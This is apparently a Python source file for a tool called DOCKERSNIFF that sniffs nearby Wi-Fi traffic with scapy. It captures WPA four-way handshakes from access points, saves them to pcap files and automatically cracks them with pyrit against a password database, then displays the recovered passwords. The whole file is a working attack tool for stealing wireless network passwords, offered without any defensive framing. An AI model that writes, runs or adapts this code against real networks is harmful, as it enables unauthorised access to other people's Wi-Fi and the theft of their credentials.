import os
import subprocess
from packet import Beacon
from scapy.packet import *
from scapy.fields import ByteEnumField, FlagsField, BitEnumField, ShortField, LongField, StrFixedLenField, FieldLenField, StrLenField
from scapy.all import Ether, Dot11, Dot11Beacon, EAPOL, EAP, LEAP, sniff, bind_layers, PcapWriter
from scapy.all import eap_types as EAP_TYPES
from threading import Event, Thread, Lock, Timer
from time import sleep
from prettytable import PrettyTable

bssids = {}
wpa_handshakes = {}
CHANNEL = os.environ['DS_CHANNEL'] or 1
cracked_passwords = []
class EAPOLKey(Packet):
    name = "EAPOL - Key Descriptor Header"
    fields_desc = [ ByteEnumField("desc_type", 2, {1: "RC4", 2: "802.11", 254: "WPA"}),]

class EAPOLKeyDot11(Packet):
    name = "EAPOL - Key Descriptor - 802.11"
    fields_desc = [ FlagsField("flags", 0, 13, ["KeyType", "res4", "res5", "Install", "ACK",
                                                "MIC", "Secure", "Error", "Request", "Encrypted", "SMK", "res14", "res15"]),
                    BitEnumField("version", 1, 3, {1: "MD5/RC4", 2: "SHA1/AES"}),
                    ShortField("keylen", 0),
                    LongField("replay", 0),
                    StrFixedLenField("nonce", "\x00" * 32, 32),
                    StrFixedLenField("iv", "\x00" * 16, 16),
                    StrFixedLenField("rsc", "\x00" * 8, 8),
                    LongField("res", 0),
                    StrFixedLenField("mic", "\x00" * 16, 16),
                    FieldLenField("keydatalen", None, length_of="keydata", fmt="H"),
                    StrLenField("keydata", "", length_from=lambda x: x.keydatalen) ]

    
bind_layers( Ether,         EAPOL,          type=0x888E)
bind_layers( EAPOL,         EAP,            type=0)
bind_layers( EAPOL,         EAPOLKey,       type=3)
bind_layers( EAPOLKey,      EAPOLKeyDot11,  desc_type=254)
bind_layers( EAPOLKey,      EAPOLKeyDot11,  desc_type=2)


def _write_pcap(beacon, handshake, bssid, count):
    pktdump = PcapWriter("handshake_{}_{}.pcap".format(bssid, count), append=True)
    pktdump.write(handshake["FRAME1"])
    pktdump.write(handshake["FRAME2"])
    pktdump.write(handshake["FRAME3"])
    pktdump.write(handshake["FRAME4"])
    pktdump.write(beacon)
    pktdump.close()
    # fix issues with wpaclean, not sure why this is necessary
    os.system("wpaclean cleaned_{}_{}.pcap handshake_{}_{}.pcap >/dev/null 2>&1".format(bssid, count, bssid, count))
    _crack_pcap("cleaned_{}_{}.pcap".format(bssid, count))
    # remove after done

def _crack_pcap(filename):
    pyrit_command = "/usr/bin/pyrit -u sqlite:////opt/dockersniff/pyrit.db -r {} attack_db".format(filename)
    p = subprocess.Popen(pyrit_command, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    p_status = p.wait
    output = str(output)
    if "The password is" in str(output):
        cracked_passwords.append(output[output.rfind("The password is") + 16:-6].replace("'",""))

def _get_source(packet):
    try:
        return packet.getlayer(Ether).src
    except:
        return packet.getlayer(Dot11).addr2

def _get_destination(packet):
    try:
        return packet.getlayer(Ether).dst
    except:
        return packet.getlayer(Dot11).addr1

def extract_data(packet):
    # Beacon Frame
    if packet.haslayer(Dot11Beacon):
        beacon = Beacon(packet)
        ssid_dec = beacon.ssid.decode()
        if beacon.bssid in bssids:
            bssids[beacon.bssid]["BEACONS"] += 1
            if ssid_dec not in bssids[beacon.bssid]["SSIDS"]:
                bssids[beacon.bssid]["SSIDS"].append(ssid_dec)
        else:
            bssids[beacon.bssid] = {
                "BEACON": packet,
                "SSIDS": [ssid_dec],
                "BEACONS": 1,
                "HANDSHAKE": {
                    "FRAME1": None,
                    "FRAME2": None,
                    "FRAME3": None,
                    "FRAME4": None,
                    "PARTIAL": 0,
                    "FULL": 0
                }, 
            }
        return

    # WPA EAPOL Frame
    if packet.haslayer(EAPOL):
        eapol_packet = packet.getlayer(EAPOL)
        try:
            if eapol_packet.flags == 17:
                bssid = _get_source(packet)
                # Partial handshakes require frame 1 and 2
                if bssids[bssid]["HANDSHAKE"]["FRAME1"] != None:
                    bssids[bssid]["HANDSHAKE"]["FRAME2"] = None 
                    bssids[bssid]["HANDSHAKE"]["FRAME3"] = None 
                    bssids[bssid]["HANDSHAKE"]["FRAME4"] = None
                bssids[bssid]["HANDSHAKE"]["FRAME1"] = packet
            elif eapol_packet.flags == 33:
                bssid = _get_destination(packet)

                # Set frame2 only if we have an active frame1, otherwise do nothing
                if bssids[bssid]["HANDSHAKE"]["FRAME1"] != None:
                    bssids[bssid]["HANDSHAKE"]["PARTIAL"] += 1
                    bssids[bssid]["HANDSHAKE"]["FRAME2"] = packet 

            elif eapol_packet.flags == 633 or eapol_packet.flags == 57:
                bssid = _get_source(packet)
                
                # Set frame3 only if we have an active frame2, otherwise do nothing
                if bssids[bssid]["HANDSHAKE"]["FRAME2"] != None:
                    bssids[bssid]["HANDSHAKE"]["FRAME3"] = packet
            
            elif eapol_packet.flags == 97 or eapol_packet.flags == 33:
                bssid = _get_destination(packet)
                
                # Set frame4 only if we have an active frame3, otherwise do nothing
                if bssids[bssid]["HANDSHAKE"]["FRAME3"] != None:
                    bssids[bssid]["HANDSHAKE"]["FRAME4"] = packet 
                    # If we get a frame 4, we should have a full handshake
                    # Deduct 1 from partial and add 1 to full
                    bssids[bssid]["HANDSHAKE"]["PARTIAL"] -= 1
                    bssids[bssid]["HANDSHAKE"]["FULL"] += 1
                    _write_pcap(bssids[bssid]['BEACON'],bssids[bssid]["HANDSHAKE"], bssid, bssids[bssid]["HANDSHAKE"]["FULL"])
        except Exception as e:
            print("Error: %s" % e)
            exit(1) 

    # EAP Frame
    elif packet.haslayer(EAP):
        pass

class TimerThread(Thread):
    def __init__(self, event):
        Thread.__init__(self)
        self.stopped = event

    def run(self):
        while not self.stopped.wait(0.5):
            refreshScreen()

def refreshScreen():
    os.system("clear")
    print("DOCKERSNIFF - CH: {}".format(CHANNEL))
    t = PrettyTable(["BSSID", "SSID(S)", "BEACONS", "Partial", "Full"])
    for bssid in bssids:
        ssids = ",".join(bssids[bssid]["SSIDS"])
        beacons = bssids[bssid]["BEACONS"] if bssids[bssid]["BEACONS"] < 9001 else "Over 9000"
        t.add_row([
            bssid, 
            ssids, 
            beacons,
            bssids[bssid]["HANDSHAKE"]["PARTIAL"],
            bssids[bssid]["HANDSHAKE"]["FULL"]
        ])
    print(t)
    cracked_p = "\nPASSWORDS\n==========================================\n"
    for password in cracked_passwords:
        cracked_p += "Found Password: {}\n".format(password)
    print(cracked_p)


if __name__ == "__main__":
    stopFlag = Event()
    thread = TimerThread(stopFlag)
    thread.start()
    sniff(iface="wlp2s0", prn=extract_data)
    stopFlag.set()
